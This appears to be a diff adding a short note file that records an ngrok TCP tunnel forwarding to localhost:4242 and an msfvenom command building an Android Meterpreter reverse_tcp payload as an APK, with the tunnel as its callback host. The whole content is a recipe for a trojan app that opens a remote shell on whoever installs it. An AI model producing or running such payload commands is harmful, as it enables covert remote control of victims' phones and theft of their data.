@@ -1,0 +1,4 @@
+Based upon Forwarding	tcp://0.tcp.ngrok.io:17197 -> localhost:4242
+
+Create Payload
+msfvenom -p android/meterpreter/reverse_tcp LHOST=tcp://0.tcp.ngrok.io LPORT=17197 R > /root/ngroktest.apk
